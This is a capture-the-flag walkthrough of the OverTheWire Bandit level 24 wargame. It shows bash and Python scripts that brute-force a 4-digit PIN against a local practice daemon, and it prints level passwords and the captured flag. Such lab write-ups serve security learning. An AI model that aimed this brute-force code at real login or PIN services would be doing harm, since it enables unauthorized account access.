# Level: BanditTwentyFour
## Level Credentials: bandit24:UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
## Level Description: *A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.*

### Steps:
Obviously going to have to use netcat. The basic command is `nc localhost 30002`.  
I just need to find out how to pass the password and pin into netcat using a bash script. 
**Brute.sh:**
`
#!/bin/bash

for i in {1..10000};
do
        nc localhost 30002 $i
done
`

OR, I could use the language I specialize in ~~and that I briefly forgot shipped with almost every linux distro known to man~~:
**brutie.py:**
>import socket  
>pass = UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  
>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
>s.connect('localhost', 30002)  
>s.recv(1024)  
>def brute(s):  
>....for i in range(10001):  
>........print(f"Trying with {pass}:{i}")  
>........s.sendall(password + str(i) + '\n')  
>........bytesrec = s.recv(1024)  
>........print(f"Message returned: {bytesrec}")  
>if __name__ == '__main__':  
>....brute(sock)  

I've spent a few days struggling with getting this script working. It says it needs the socket data in bytes, not a string, but also says the commands are bytes. Another issue is that the python on the vm is 3.5.3, which doesnt have fstrings. 
### Solution:
**brutie.py:**
>import socket  
>import traceback  
>  
>  
>b24 =  'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'  
>  
>  
>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
>sock.connect(('localhost', 30002))  
>sock.recv(1024)  
>  
>  
>def brute():  
>....print("Brute forcing...")  
>....while True:  
>........for i in range(0, 10000):  
>............try:  
>...............sockdata = '{} {}\n'.format(b24, i)  
>...............sock.sendall(sockdata.encode("utf-8"))  
>...............bytesrec = sock.recv(1024)  
>...............if 'wrong' in str(bytesrec).lower():  
>...................continue  
>...............else:  
>...................sm = str(b24) + ":" + str(i)  
>...................print(str(sm))  
>............except Exception as e:  
>................trace = traceback.format_exc()  
>................print(trace)  
>  
>  
>brute()  

The issue was actually not in the line with the .sendall() method, but the line with the bytesrec comparison.  


**Flag: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG**
